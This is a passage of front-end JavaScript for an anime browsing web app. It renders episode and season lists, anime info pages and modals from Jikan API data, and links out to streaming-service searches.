                                <div class="episode-item flex items-start gap-4 p-4 bg-zinc-50 dark:bg-zinc-800 rounded-2xl hover:bg-white dark:hover:bg-zinc-700 transition-all cursor-pointer group border border-zinc-200 dark:border-zinc-700 hover:border-brand/30 shadow-sm"
                                     onclick="openEpisodePlayer(${animeId}, ${episode.mal_id || episodeNumber}, '${title.replace(/'/g, "\\'")} - ${safeTitle}', '${safeTitle}')">
                                    <div class="relative w-20 h-28 md:w-24 md:h-32 flex-shrink-0 rounded-xl overflow-hidden">
                                        <img src="${episodeImage}" 
                                             alt="${episodeTitle}"
                                             class="w-full h-full object-cover group-hover:scale-110 transition-transform duration-300"
                                             onerror="this.src='${mainAnimeImage}'">
                                        <div class="absolute inset-0 bg-gradient-to-t from-black/60 via-transparent to-transparent"></div>
                                        <div class="absolute bottom-2 left-2 bg-black/80 text-white text-xs font-black px-2 py-1 rounded">
                                            E${episodeNumber}
                                        </div>
                                        <div class="absolute top-2 right-2 bg-black/60 text-white w-7 h-7 rounded-full flex items-center justify-center opacity-0 group-hover:opacity-100 transition-opacity">
                                            <i class="fas fa-play text-xs"></i>
                                        </div>
                                    </div>
                                    
                                    <div class="flex-1 min-w-0">
                                        <div class="flex items-start justify-between mb-2">
                                            <div class="flex-1">
                                                <h3 class="font-bold text-zinc-900 dark:text-white text-sm md:text-base group-hover:text-brand transition-colors line-clamp-2 leading-snug min-h-[3em]">
                                                    Episode ${episodeNumber}: ${episodeTitle}
                                                </h3>
                                            </div>
                                            <div class="hidden sm:block opacity-0 group-hover:opacity-100 transition-opacity ml-4">
                                                <i class="fas fa-play-circle text-brand text-2xl"></i>
                                            </div>
                                        </div>
                                        
                                        <div class="flex items-center gap-2 mb-3">
                                            <span class="bg-white dark:bg-zinc-900 px-2 py-0.5 rounded text-xs font-bold text-brand border border-zinc-300 dark:border-zinc-700">
                                                Episode ${episodeNumber}
                                            </span>
                                            <span class="text-xs text-zinc-500">•</span>
                                            <span class="text-xs text-zinc-500">
                                                <i class="far fa-clock mr-1"></i>24 min
                                            </span>
                                        </div>
                                        
                                        <div class="flex flex-wrap gap-2">
                                            <button onclick="event.stopPropagation(); openEpisodePlayer(${animeId}, ${episode.mal_id || episodeNumber}, '${title.replace(/'/g, "\\'")} - ${safeTitle}', '${safeTitle}')"
                                                    class="bg-brand hover:bg-red-600 text-white px-4 py-2 rounded-lg text-xs font-bold flex items-center gap-2 transition-all shadow-md">
                                                <i class="fas fa-play mr-1"></i> Watch
                                            </button>
                                            <button onclick="event.stopPropagation(); playTrailer('${title.replace(/'/g, "\\'")}', ${animeId})"
                                                    class="bg-white dark:bg-zinc-700 hover:bg-zinc-100 dark:hover:bg-zinc-600 text-zinc-700 dark:text-zinc-300 px-4 py-2 rounded-lg text-xs font-bold flex items-center gap-2 transition-all border border-zinc-300 dark:border-zinc-600 shadow-sm">
                                                <i class="fas fa-film mr-1"></i> Trailer
                                            </button>
                                        </div>
                                    </div>
                                </div>
                            `;
                        }).join('')}
                    </div>
                    
                    ${season.episodes.length > 0 ? `
                        <div class="mt-8 pt-6 border-t dark:border-zinc-800 text-center">
                            <p class="text-zinc-500 text-sm">
                                Season ${season.number} • ${season.episodeCount} Episodes
                            </p>
                        </div>
                    ` : ''}
                </div>
            `;
        }).join('');
        
        // Initialize scroll tracking for seasons
        setTimeout(() => {
            initSeasonScrollTracking();
        }, 500);
        
        // Add animation to episodes
        setTimeout(() => {
            const episodeItems = document.querySelectorAll('.episode-item');
            episodeItems.forEach((item, index) => {
                item.style.animationDelay = `${index * 0.05}s`;
                item.classList.add('reveal', 'active');
            });
        }, 100);
        
    } catch (error) {
        console.error('Error loading episodes:', error);
        const seasonsContainer = document.getElementById('seasonsContainer');
        seasonsContainer.innerHTML = `
            <div class="text-center py-16 bg-red-50 dark:bg-red-900/20 rounded-3xl">
                <i class="fas fa-exclamation-triangle text-4xl text-red-500 mb-4"></i>
                <p class="text-red-500 font-bold text-lg mb-2">Failed to load episodes</p>
                <p class="text-zinc-500 text-sm mb-6">API limit reached or network error</p>
                <div class="flex flex-col sm:flex-row gap-3 justify-center">
                    <button onclick="openEpisodesPage(${animeId}, '${title}', '${mainAnimeImage}')" 
                            class="px-6 py-3 bg-brand text-white rounded-xl font-bold transition-all shadow-md">
                        <i class="fas fa-redo mr-2"></i> Try Again
                    </button>
                </div>
            </div>
        `;
    }
}

// Season scroll tracking function
function initSeasonScrollTracking() {
    const seasonNav = document.getElementById('seasonNav');
    const seasonButtons = document.querySelectorAll('.season-nav-btn');
    const seasonSections = document.querySelectorAll('.season-section');
    const indicator = document.getElementById('seasonIndicator');
    
    if (!seasonNav || !seasonButtons.length || !seasonSections.length || !indicator) return;
    
    // Function to update active season
    function updateActiveSeason() {
        let activeSeason = 1;
        let closestDistance = Infinity;
        
        seasonSections.forEach((section, index) => {
            const rect = section.getBoundingClientRect();
            const distance = Math.abs(rect.top - seasonNav.offsetHeight - 20);
            
            if (distance < closestDistance) {
                closestDistance = distance;
                activeSeason = index + 1;
            }
        });
        
        // Update button styles
        seasonButtons.forEach(btn => {
            const seasonNum = parseInt(btn.getAttribute('data-season'));
            const isActive = seasonNum === activeSeason;
            
            if (isActive) {
                btn.classList.add('bg-brand', 'text-white', 'border-brand', 'shadow-md');
                btn.classList.remove('bg-white', 'dark:bg-zinc-800', 'hover:bg-brand');
                
                // Update indicator position
                const btnRect = btn.getBoundingClientRect();
                const containerRect = btn.parentElement.getBoundingClientRect();
                indicator.style.width = `${btnRect.width}px`;
                indicator.style.transform = `translateX(${btnRect.left - containerRect.left}px)`;
            } else {
                btn.classList.remove('bg-brand', 'text-white', 'border-brand', 'shadow-md');
                btn.classList.add('bg-white', 'dark:bg-zinc-800', 'hover:bg-brand');
            }
        });
    }
    
    // Initial update
    updateActiveSeason();
    
    // Update on scroll
    const overlay = document.getElementById('infoPageOverlay');
    overlay.addEventListener('scroll', updateActiveSeason);
    
    // Also update when window scrolls (for good measure)
    window.addEventListener('scroll', updateActiveSeason);
    
    // Debounce the scroll event
    let scrollTimeout;
    overlay.addEventListener('scroll', () => {
        clearTimeout(scrollTimeout);
        scrollTimeout = setTimeout(updateActiveSeason, 100);
    });
}

// Scroll to season function
function scrollToSeason(seasonNumber) {
    const seasonElement = document.getElementById(`season-${seasonNumber}`);
    const seasonNav = document.getElementById('seasonNav');
    
    if (seasonElement && seasonNav) {
        // Calculate position with offset for sticky nav
        const offset = seasonNav.offsetHeight + 40;
        const elementPosition = seasonElement.offsetTop;
        const overlay = document.getElementById('infoPageOverlay');
        
        // Scroll the overlay
        overlay.scrollTo({
            top: elementPosition - offset,
            behavior: 'smooth'
        });
        
        // Update button immediately
        const seasonButtons = document.querySelectorAll('.season-nav-btn');
        seasonButtons.forEach(btn => {
            const btnSeasonNum = parseInt(btn.getAttribute('data-season'));
            const isActive = btnSeasonNum === seasonNumber;
            
            if (isActive) {
                btn.classList.add('bg-white', 'text-white', 'border-brand', 'shadow-md');
                btn.classList.remove('bg-white', 'dark:bg-zinc-800', 'hover:bg-brand');
            } else {
                btn.classList.remove('bg-white', 'text-white', 'border-brand', 'shadow-md');
                btn.classList.add('bg-white', 'dark:bg-zinc-800', 'hover:bg-brand');
            }
        });
    }
}
// Helper function to generate episode titles
// Update the generateEpisodeTitle function to prevent "undefined" titles
function generateEpisodeTitle(animeTitle, episodeNum) {
    const episodeTitles = {
        // Demon Slayer episodes
        'Demon Slayer': [
            'Cruelty - The Beginning of a Journey',
            'Trainer Sakonji Urokodaki - The Master Appears',
            'Sabito and Makomo - The Final Test',
            'Final Selection - Proving Worth',
            'My Own Steel - Forging the Blade',
            'Swordsman Accompanying a Demon - First Mission',
            'Muzan Kibutsuji - The Demon King',
            'The Smell of Enchanting Blood - Temple Battle',
            'Temari Demon and Arrow Demon - Twin Threat',
            'Together Forever - Bonds That Last',
            'Tsuzumi Mansion - The Drum House',
            'The Boar Bares Its Fangs, Zenitsu Sleeps - New Allies'
        ],
        // Jujutsu Kaisen episodes
        'Jujutsu Kaisen': [
            'Ryomen Sukuna - The King of Curses',
            'For Myself - A New Purpose',
            'Strong - The First Assignment',
            'Curse Womb Must Die - School Mystery',
            'Curse - The Origin of Fear',
            'After Rain - Cleansing the Spirits',
            'Assault - Unexpected Attack',
            'Boredom - The Calm Before Storm',
            'Small Fry and Reverse Retribution - Justice Served'
        ],
        // Add more anime titles as needed
        'Naruto': [
            'Enter: Naruto Uzumaki!',
            'My Name is Konohamaru!',
            'Sasuke and Sakura: Friends or Foes?',
            'Pass or Fail: Survival Test',
            'You Failed! Kakashi\'s Final Decision',
            'A Dangerous Mission! Journey to the Land of Waves!',
            'The Assassin of the Mist!',
            'The Oath of Pain',
            'Kakashi: Sharingan Warrior',
            'The Forest of Chakra'
        ]
    };
    
    // Clean anime title
    const cleanAnimeTitle = animeTitle.split(' - ')[0].trim();
    const titles = episodeTitles[cleanAnimeTitle];
    
    if (titles && titles[episodeNum - 1]) {
        return titles[episodeNum - 1];
    }
    
  
    // Fallback titles with more descriptive names
    const fallbackTitles = [
        'The Beginning - A New Journey Starts',
        'Unexpected Challenges - First Obstacles',
        'Mysterious Encounters - Allies Appear',
        'Battle Begins - First Confrontation',
        'Secrets Revealed - Hidden Truths',
        'Allies and Enemies - Shifting Alliances',
        'Turning Point - Critical Moment',
        'Darkness Falls - Greatest Threat',
        'Hope Returns - Light in Darkness',
        'Final Confrontation - Ultimate Battle',
        'Aftermath - Consequences',
        'New Journey - Next Chapter'
    ];
    
    return fallbackTitles[(episodeNum - 1) % fallbackTitles.length] || `Episode ${episodeNum}`;
}

async function openEpisodes(animeId, seasonNumber, animeTitle) {
    const modal = document.getElementById('episodesModal');
    const titleEl = document.getElementById('episodesModalTitle');
    const subtitleEl = document.getElementById('episodesModalSubtitle');
    const gridEl = document.getElementById('episodesGrid');
    
    titleEl.innerHTML = animeTitle;
    subtitleEl.textContent = `Season ${seasonNumber} • Select an episode`;
    
    // टाइटल स्टाइलिंग ठीक करें
    titleEl.style.overflowWrap = 'break-word';
    titleEl.style.wordBreak = 'break-word';
    titleEl.style.lineHeight = '1.2';
    titleEl.style.paddingRight = '2rem'; // close button के लिए space
    
    gridEl.innerHTML = '<div class="col-span-full text-center py-10 animate-pulse">Loading episodes...</div>';
    
    closeSeasonsModal();
    modal.classList.remove('hidden');
    document.body.classList.add('modal-open');
    document.documentElement.style.overflow = 'hidden';
    
    try {
        let seasons = animeCache.get(`seasons_${animeId}`);
        
        // If not cached, create default episodes
        if (!seasons || seasons.length === 0) {
            seasons = [{
                number: 1,
                episodes: Array.from({length: 12}, (_, i) => ({
                    mal_id: i + 1,
                    title: `Episode ${i + 1}`,
                    episode: i + 1
                }))
            }];
        }
        
        const season = seasons.find(s => s.number === seasonNumber) || seasons[0];
        
        if (season && season.episodes) {
            gridEl.innerHTML = season.episodes.map(episode => `
                <div class="episode-card bg-zinc-50 dark:bg-zinc-800 rounded-2xl p-4 hover:bg-zinc-100 dark:hover:bg-zinc-700 transition-all cursor-pointer"
                     onclick="openEpisodePlayer(${animeId}, ${episode.mal_id || episode.episode}, '${animeTitle.replace(/'/g, "\\'")} - Episode ${episode.episode}', '${episode.title || `Episode ${episode.episode}`}')">
                    <div class="flex items-center gap-3">
                        <div class="w-10 h-10 bg-brand/10 text-brand rounded-xl flex items-center justify-center font-black flex-shrink-0">
                            ${episode.episode}
                        </div>
                        <div class="flex-1 min-w-0">
                            <h4 class="font-bold text-sm truncate" style="word-break: break-word; overflow-wrap: break-word;">${episode.title || `Episode ${episode.episode}`}</h4>
                            <p class="text-xs text-zinc-500 truncate">Episode ${episode.episode}</p>
                        </div>
                    </div>
                </div>
            `).join('');
        } else {
            // Fallback episodes
            gridEl.innerHTML = Array.from({length: 12}, (_, i) => `
                <div class="episode-card bg-zinc-50 dark:bg-zinc-800 rounded-2xl p-4 hover:bg-zinc-100 dark:hover:bg-zinc-700 transition-all cursor-pointer"
                     onclick="openEpisodePlayer(${animeId}, ${i + 1}, '${animeTitle.replace(/'/g, "\\'")} - Episode ${i + 1}', 'Episode ${i + 1}')">
                    <div class="flex items-center gap-3">
                        <div class="w-10 h-10 bg-brand/10 text-brand rounded-xl flex items-center justify-center font-black flex-shrink-0">
                            ${i + 1}
                        </div>
                        <div class="flex-1 min-w-0">
                            <h4 class="font-bold text-sm truncate" style="word-break: break-word; overflow-wrap: break-word;">Episode ${i + 1}</h4>
                            <p class="text-xs text-zinc-500 truncate">Click to watch</p>
                        </div>
                    </div>
                </div>
            `).join('');
        }
        
    } catch (error) {
        console.error('Error loading episodes:', error);
        gridEl.innerHTML = `
            <div class="col-span-full text-center py-10">
                <i class="fas fa-exclamation-triangle text-3xl text-red-500 mb-4"></i>
                <p class="text-red-500">Failed to load episodes</p>
                <button onclick="openEpisodes(${animeId}, ${seasonNumber}, '${animeTitle}')" 
                        class="mt-4 px-4 py-2 bg-brand text-white rounded-lg text-sm font-bold">
                    Try Again
                </button>
            </div>
        `;
    }
}

// Update the openEpisodePlayer function
    async function openEpisodePlayer(animeId, episodeId, title, description) {
    // Add to history
    window.history.pushState({ 
        page: 'episode-player', 
        animeId: animeId, 
        episodeId: episodeId,
        from: 'frontier' 
    }, '', `#episode-${animeId}-${episodeId}`);
    
    try {
        const animeRes = await fetch(`${JIKAN_API}/anime/${animeId}`);
        const animeData = await animeRes.json();
        
        const playerModal = document.getElementById('episodePlayerModal');
        const playerTitle = document.getElementById('episodePlayerTitle');
        const playerDesc = document.getElementById('episodePlayerDesc');
        const playerContainer = document.getElementById('episodePlayerContainer');
        
        // Clean up title and description
        const cleanTitle = cleanEpisodeTitle(title);
        const cleanDesc = cleanEpisodeTitle(description) || `Episode ${episodeId}`;
        
        // Set title with proper line breaks
        playerTitle.textContent = cleanTitle;
        playerDesc.textContent = cleanDesc;
        
        // Set trailer button
        document.getElementById('playTrailerBtn').onclick = () => {
            closeEpisodePlayer();
            setTimeout(() => playTrailer(animeData.data.title, animeId), 300);
        };
        
        // Set episode player button
        document.getElementById('playEpisodeBtn').onclick = () => {
            playerContainer.innerHTML = `
                <div class="w-full h-full flex flex-col items-center justify-center bg-black text-white p-8">
                    <div class="text-center max-w-lg">
                        <i class="fas fa-play-circle text-6xl mb-6 text-brand"></i>
                        <h3 class="text-2xl md:text-3xl font-black mb-4 text-center" style="word-break: break-word; line-height: 1.3; padding: 0 1rem;">
                            ${cleanTitle}
                        </h3>
                        <p class="text-zinc-400 mb-8 text-lg">${cleanDesc}</p>
                        <div class="flex flex-col sm:flex-row gap-4 justify-center">
                            <button onclick="playTrailer('${animeData.data.title.replace(/'/g, "\\'")}', ${animeId})" 
                                    class="px-8 py-3 bg-orange-500 rounded-xl font-bold text-lg hover:bg-orange-600 transition-colors flex items-center justify-center gap-2">
                                <i class="fas fa-film mr-2"></i> Watch Trailer
                            </button>
                            <a href="https://www.crunchyroll.com/search?q=${encodeURIComponent(animeData.data.title)}" 
                               target="_blank" 
                               class="px-8 py-3 bg-brand rounded-xl font-bold text-lg hover:bg-red-600 transition-colors text-center flex items-center justify-center gap-2">
                                <i class="fas fa-external-link-alt mr-2"></i> Watch on Crunchyroll
                            </a>
                        </div>
                    </div>
                </div>
            `;
        };
        
        playerModal.classList.remove('hidden');
        document.body.classList.add('modal-open');
        document.documentElement.style.overflow = 'hidden';
        
        // Reset player container
        playerContainer.innerHTML = `
            <div class="w-full h-full flex flex-col items-center justify-center bg-zinc-900 text-white">
                <div class="text-center p-8">
                    <div class="inline-block animate-spin rounded-full h-16 w-16 border-4 border-brand border-t-transparent mb-6"></div>
                    <h3 class="text-2xl font-black mb-2">Ready to Play</h3>
                    <p class="text-zinc-400 mb-6">Click "Watch Episode" to begin</p>
                </div>
            </div>
        `;
        
    } catch (error) {
        console.error('Error loading episode player:', error);
        alert('Failed to load episode details. Please try again.');
    }
}

function closeEpisodePlayer() {
    const modal = document.getElementById('episodePlayerModal');
    
    // Check if we have a history state from our app
    if (window.history.state && window.history.state.from === 'episode-player') {
        window.history.back();
    } else {
        modal.classList.add('hidden');
        document.body.classList.remove('modal-open');
        document.documentElement.style.overflow = 'auto';
    }
}
// Add this helper function to clean episode titles
// Update the cleanEpisodeTitle function to properly remove "undefined"
function cleanEpisodeTitle(title) {
    if (!title || title === 'undefined' || title === 'undefined - undefined') {
        return 'Episode';
    }
    
    // Remove any "undefined" text
    let cleaned = title.replace(/undefined/gi, '')
                       .replace(/\s*-\s*$/g, '') // Remove trailing dash
                       .replace(/^\s*-\s*/g, '') // Remove leading dash
                       .replace(/\s+/g, ' ') // Remove extra spaces
                       .trim();
    
    // If title is empty after cleaning, return a generic title
    if (!cleaned || cleaned === '-') {
        return 'Episode';
    }
    
    return cleaned;
}

// ==================== ENHANCED INFO PAGE ====================

async function openInfoPage(animeId, title) {
    const overlay = document.getElementById('infoPageOverlay');
    const content = document.getElementById('infoPageContent');
    
    // Add a URL hash to track the state for browser back button
    window.history.pushState({ page: 'info', animeId: animeId, from: 'frontier' }, '', `#info-${animeId}`);
    
    overlay.style.display = "block";
    document.documentElement.style.overflow = 'hidden'; // Prevent body scroll
    content.innerHTML = `<div class="py-20 text-center animate-pulse font-black uppercase text-brand italic">Loading details...</div>`;
  
    
    try {
        const [animeRes, charactersRes, episodesRes] = await Promise.all([
            fetch(`${JIKAN_API}/anime/${animeId}`),
            fetch(`${JIKAN_API}/anime/${animeId}/characters`),
            fetch(`${JIKAN_API}/anime/${animeId}/episodes`)
        ]);
        
        const anime = await animeRes.json();
        const characters = await charactersRes.json();
        const episodes = await episodesRes.json();
        
        const episodeList = episodes.data || [];
        const seasons = [];
        const episodesPerSeason = 12;
        
        for (let i = 0; i < episodeList.length; i += episodesPerSeason) {
            const seasonEpisodes = episodeList.slice(i, i + episodesPerSeason);
            seasons.push({
                number: Math.floor(i / episodesPerSeason) + 1,
                episodes: seasonEpisodes,
                episodeCount: seasonEpisodes.length
            });
        }
        
        if (seasons.length === 0) {
            seasons.push({
                number: 1,
                episodes: [],
                episodeCount: anime.data.episodes || '?'
            });
        }
        
        content.innerHTML = `
            <div class="space-y-12">
                <div class="grid md:grid-cols-3 gap-12">
                    <div class="md:col-span-1">
                        <img src="${anime.data.images.jpg.large_image_url}" 
                             class="w-full rounded-[3.5rem] shadow-2xl border-4 border-brand/20"
                             onerror="this.src='https://via.placeholder.com/400x600/1a1a2e/ffffff?text=Anime'">
                    </div>
                    <div class="md:col-span-2">
                        <h1 class="text-4xl md:text-7xl font-black uppercase italic tracking-tighter text-brand leading-none">
                            ${getEnglishTitle(anime.data)}
                        </h1>
                        <p class="text-sm text-zinc-500 dark:text-zinc-400 mt-4">
                            ${anime.data.type} • ${anime.data.episodes || '?'} episodes • ${anime.data.status}
                        </p>
                        <div class="flex flex-wrap gap-2 mt-6">
                            ${anime.data.genres.map(g => 
                                `<span class="bg-brand/10 text-brand px-4 py-1 rounded-full text-xs font-bold">${g.name}</span>`
                            ).join('')}
                        </div>
                        <p class="mt-8 text-zinc-700 dark:text-zinc-300 leading-relaxed">
                            ${anime.data.synopsis || 'No synopsis available.'}
                        </p>
                    </div>
                </div>
                
                <div class="bg-zinc-50 dark:bg-zinc-900/50 rounded-3xl p-8">
                    <h2 class="text-3xl font-black uppercase italic mb-6">Seasons</h2>
                    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
${seasons.map(season => `
    <div class="bg-white dark:bg-zinc-800 rounded-2xl p-6 hover:shadow-lg transition-all cursor-pointer"
         onclick="openEpisodesPage(${animeId}, '${getEnglishTitle(anime.data).replace(/'/g, "\\'")}', '${anime.data.images.jpg.large_image_url}')">
        <div class="flex justify-between items-center">
            <div>
                <h3 class="text-xl font-black">Season ${season.number}</h3>
                <p class="text-sm text-zinc-500">${season.episodeCount} episodes</p>
            </div>
            <i class="fas fa-play text-brand"></i>
        </div>
    </div>
`).join('')}

                    </div>
                </div>
                
                <div class="bg-zinc-50 dark:bg-zinc-900/50 rounded-3xl p-8">
                    <h2 class="text-3xl font-black uppercase italic mb-6">Characters</h2>
                    <div class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 gap-6">
                        ${characters.data.slice(0, 12).map(char => `
                            <div class="character-card text-center group">
                                <div class="relative rounded-2xl overflow-hidden aspect-[3/4] mb-3">
                                    <img src="${char.character.images.jpg.image_url}" 
                                         alt="${char.character.name}"
                                         class="w-full h-full object-cover group-hover:scale-110 transition-transform duration-300"
                                         onerror="this.src='https://via.placeholder.com/200x300/2a2a3e/ffffff?text=Character'">
                                </div>
                                <h4 class="font-bold text-sm truncate">${char.character.name}</h4>
                                <p class="text-xs text-zinc-500 truncate">${char.role}</p>
                            </div>
                        `).join('')}
                    </div>
                    ${characters.data.length > 12 ? 
                        `<p class="text-center mt-6 text-zinc-500">+ ${characters.data.length - 12} more characters</p>` : 
                        ''}
                </div>
                
                <div class="grid grid-cols-2 md:grid-cols-4 gap-6">
                    <div class="bg-brand/10 p-6 rounded-3xl text-center">
                        <p class="text-sm text-zinc-500">Score</p>
                        <p class="text-3xl font-black text-brand">${anime.data.score || 'N/A'}</p>
                    </div>
                    <div class="bg-brand/10 p-6 rounded-3xl text-center">
                        <p class="text-sm text-zinc-500">Rank</p>
                        <p class="text-3xl font-black text-brand">#${anime.data.rank || 'N/A'}</p>
                    </div>
                    <div class="bg-brand/10 p-6 rounded-3xl text-center">
                        <p class="text-sm text-zinc-500">Popularity</p>
                        <p class="text-3xl font-black text-brand">#${anime.data.popularity || 'N/A'}</p>
                    </div>
                    <div class="bg-brand/10 p-6 rounded-3xl text-center">
                        <p class="text-sm text-zinc-500">Members</p>
                        <p class="text-3xl font-black text-brand">${(anime.data.members / 1000000).toFixed(1)}M</p>
                    </div>
                </div>
            </div>
        `;
        
    } catch (error) {
        console.error('Error loading anime info:', error);
        content.innerHTML = `
            <div class="text-center py-20">
                <i class="fas fa-exclamation-triangle text-4xl text-red-500 mb-4"></i>
                <p class="text-red-500 font-bold text-lg mb-2">Failed to load anime details</p>
                <p class="text-zinc-500 text-sm mb-6">Network error or API limit reached</p>
                <button onclick="openInfoPage(${animeId}, '${title.replace(/'/g, "\\'")}')" 
                        class="px-6 py-3 bg-brand text-white rounded-xl font-bold transition-all">
                    <i class="fas fa-redo mr-2"></i> Try Again
                </button>
            </div>
        `;
    }
}
function closeInfoPage() { 
    const overlay = document.getElementById('infoPageOverlay');
    
    // Check if we have a history state from our app
    if (window.history.state && window.history.state.from === 'frontier') {
        // Go back in history
        window.history.back();
    } else {
        // Just close the overlay
        overlay.style.display = "none";
        document.documentElement.style.overflow = 'auto';
    }
}

// Handle browser back/forward buttons
function handlePopState(event) {
    const overlay = document.getElementById('infoPageOverlay');
    
    // Check the current hash
    if (window.location.hash.includes('info-') || window.location.hash.includes('episodes-')) {
        // We're still on an info/episodes page, keep overlay open
        overlay.style.display = "block";
        document.documentElement.style.overflow = 'hidden';
    } else {
        // Hash doesn't contain info or episodes, close overlay
        overlay.style.display = "none";
        document.documentElement.style.overflow = 'auto';
    }
}
// ==================== SELECTOR MODAL FUNCTIONS ====================

function openAnimeSelector(animeId, title, image) {
    // Track anime opened
    if (currentUser && animeId) {
        const animeData = {
            id: animeId,
            title: title,
            time: new Date().toISOString()
        };
        
        // Check if already tracked
        const alreadyTracked = userActivity.openedAnime.some(a => a.id === animeId);
        if (!alreadyTracked) {
            userActivity.openedAnime.push(animeData);
        }
    }
    
    const modal = document.getElementById('selectorModal');
    const modalContent = document.getElementById('modalContent');
    
    document.getElementById('modalTitle').innerText = title;
    document.getElementById('seasonLinks').innerHTML = `
        <div class="p-8 text-center bg-zinc-50 dark:bg-zinc-800 rounded-3xl shadow-inner">
            <img src="${image}" class="w-36 h-52 object-cover mx-auto rounded-2xl shadow-xl mb-4">
            <p class="text-zinc-500 text-[10px] font-black italic">Loading details...</p>
        </div>`;
        
    fetch(`${JIKAN_API}/anime/${animeId}`)
        .then(res => res.json())
        .then(data => {
            const anime = data.data;
            
            if (anime.type === 'Movie') {
                document.getElementById('seasonLinks').innerHTML = `
                    <div class="p-6 text-center">
                        <i class="fas fa-film text-4xl text-brand mb-4"></i>
                        <h4 class="text-lg font-bold mb-2">${anime.title}</h4>
                        <p class="text-sm text-zinc-500 mb-4">Movie • ${anime.duration || 'N/A'}</p>
                        <button onclick="window.open('https://www.crunchyroll.com/search?q=${encodeURIComponent(anime.title)}', '_blank')" 
                                class="w-full bg-brand text-white py-3 rounded-xl font-bold">
                            <i class="fas fa-play mr-2"></i> Watch Movie
                        </button>
                    </div>
                `;
            } else {
                document.getElementById('seasonLinks').innerHTML = `
                    <div class="space-y-3">
                        <div class="bg-zinc-50 dark:bg-zinc-800 p-6 rounded-2xl">
                            <h4 class="font-bold text-lg mb-2">Available Seasons</h4>
                            <div class="space-y-3 mt-4">
                                <button onclick="openAnimeDetails(${animeId}, '${title.replace(/'/g, "\\'")}')" 
                                        class="w-full bg-brand text-white py-3 rounded-xl font-bold text-sm flex items-center justify-between px-4 hover:bg-red-600 transition-colors">
                                    <span><i class="fas fa-list mr-2"></i> View All Episodes</span>
                                    <i class="fas fa-chevron-right"></i>
                                </button>
                                ${anime.episodes && anime.episodes > 12 ? `
                                    <div class="text-center text-zinc-500 text-xs font-bold p-2 bg-zinc-100 dark:bg-zinc-900 rounded-lg">
                                        <i class="fas fa-info-circle mr-1"></i>
                                        Total ${anime.episodes} episodes
                                        ${anime.episodes > 12 ? `across ${Math.ceil(anime.episodes/12)} seasons` : ''}
                                    </div>
                                ` : ''}
                                ${anime.score ? `
                                    <div class="flex items-center justify-between px-3 py-2 bg-zinc-100 dark:bg-zinc-900 rounded-lg">
                                        <span class="text-xs font-bold text-zinc-500">Rating:</span>
                                        <span class="text-accent font-bold">${anime.score.toFixed(1)} ⭐</span>
                                    </div>
                                ` : ''} 
                            </div>
                        </div>
                        <div class="bg-zinc-50 dark:bg-zinc-800 p-4 rounded-2xl">
                            <div class="flex flex-wrap gap-2 justify-center">
                                ${anime.genres.slice(0, 3).map(genre => 
                                    `<span class="bg-brand/10 text-brand px-3 py-1 rounded-full text-xs font-bold">${genre.name}</span>`
                                ).join('')}
                                ${anime.genres.length > 3 ? 
                                    `<span class="bg-zinc-200 dark:bg-zinc-700 text-zinc-500 px-3 py-1 rounded-full text-xs font-bold">+${anime.genres.length - 3}</span>` 
                                    : ''}
                            </div>
                        </div>
                    </div>
                `;
            }
        })
        .catch(error => {
            console.error('Error loading anime details:', error);
            document.getElementById('seasonLinks').innerHTML = `
                <div class="p-8 text-center">
                    <i class="fas fa-exclamation-triangle text-3xl text-red-500 mb-4"></i>
                    <p class="text-red-500 font-bold mb-2">Failed to load details</p>
                    <p class="text-zinc-500 text-sm mb-4">Network error occurred</p>
                    <button onclick="openAnimeDetails(${animeId}, '${title.replace(/'/g, "\\'")}')" 
                            class="w-full bg-brand text-white py-3 rounded-xl font-bold">
                        <i class="fas fa-list mr-2"></i> View Episodes Anyway
                    </button>
                </div>
            `;
        });
    
    setupButtons(title, image, `https://myanimelist.net/anime/${animeId}`, animeId);
    
    modal.classList.remove('hidden');
    document.body.classList.add('modal-open');
    document.documentElement.style.overflow = 'hidden';
    modalContent.classList.add('scale-95', 'opacity-0');
    
    setTimeout(() => {
        modalContent.classList.remove('scale-95', 'opacity-0');
    }, 10);
    
    closeSearch();
}
function setupButtons(title, img, malUrl, animeId = null) {
    const q = encodeURIComponent(title);
    const isInWatchlist = watchlist.some(item => item.id === animeId);

    if (animeId) {
        document.getElementById('modalTrailerBtn').onclick = () => {
            closeSelector();
            setTimeout(() => playTrailer(title, animeId), 300);
        };
    } else {
        document.getElementById('modalTrailerBtn').onclick = () => playTrailer(title);
    }
    
    document.getElementById('modalWatchlistBtn').innerHTML = `
        <i class="fas ${isInWatchlist ? 'fa-check' : 'fa-bookmark'}"></i>
        ${isInWatchlist ? 'Added ✅' : 'Add to Watchlist'}
    `;
    document.getElementById('modalWatchlistBtn').onclick = () => {
        const wasAdded = toggleWatchlist({ 
            title, 
            img,
            id: animeId || Date.now(),
            type: 'anime'
        });
        document.getElementById('modalWatchlistBtn').innerHTML = `
            <i class="fas ${wasAdded ? 'fa-check' : 'fa-bookmark'}"></i>
            ${wasAdded ? 'Added ✅' : 'Add to Watchlist'}
        `;
    };

    document.getElementById('modalInfoBtn').onclick = () => {
        setTimeout(() => {
            closeSelector();
            setTimeout(() => {
                if (animeId) {
                    openInfoPage(animeId, title);
                } else {
                    openInfoPage(title);
                }
            }, 300);
        }, 100);
    };
    
    document.getElementById('btnCR').onclick = () => window.open(`https://www.crunchyroll.com/search?q=${q}`, '_blank');
    document.getElementById('btnNF').onclick = () => window.open(`https://www.netflix.com/search?q=${q}`, '_blank');
    document.getElementById('btnPV').onclick = () => window.open(`https://www.amazon.com/s?k=${q}&i=instant-video`, '_blank');
    document.getElementById('btnHU').onclick = () => window.open(`https://www.hulu.com/search?q=${q}`, '_blank');
    document.getElementById('btnMAL').onclick = () => window.open(malUrl, '_blank');
}

function closeSelector() { 
    document.getElementById('modalContent').classList.add('scale-95', 'opacity-0'); 
    setTimeout(() => {
        document.getElementById('selectorModal').classList.add('hidden');
        document.body.classList.remove('modal-open');
        document.documentElement.style.overflow = 'auto';
    }, 300); 
}

// ==================== SEARCH FUNCTIONS ====================

let searchTimer;
const searchInput = document.getElementById('animeSearch');
const suggestionsOverlay = document.getElementById('suggestionsOverlay');
const suggestionsGrid = document.getElementById('suggestionsGrid');

searchInput.oninput = (e) => {
    const query = e.target.value.trim();
    clearTimeout(searchTimer);
    
    if (query.length < 2) {
        closeSearch();
        return;
    }
    
    suggestionsOverlay.style.display = 'block';
    document.body.style.overflow = 'hidden';
